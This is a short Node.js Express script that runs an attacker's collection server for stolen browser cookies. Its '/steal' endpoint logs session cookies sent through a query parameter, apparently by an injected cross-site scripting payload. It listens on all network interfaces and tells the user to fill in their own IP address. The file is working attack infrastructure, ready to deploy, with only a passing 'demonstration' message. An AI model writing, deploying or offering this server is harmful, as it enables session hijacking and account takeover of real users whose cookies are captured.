const express = require('express');
const app = express();
const port = 3000;

// Middleware to parse query parameters
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Endpoint to receive stolen cookies
app.get('/steal', (req, res) => {
    const cookies = req.query.cookie;

    if (cookies) {
        console.log(`Stolen cookies: ${cookies}`);
        res.send('Cookies received. Thank you for the demonstration!');
    } else {
        res.send('No cookies received.');
    }
});

// Start the server and listen on all interfaces
app.listen(port, '0.0.0.0', () => {
    console.log(`Cookie server is running on http://<YOUR-IP-ADDRESS>:${port}`);
    console.log('Replace <YOUR-IP-ADDRESS> with your actual IP address.');
});
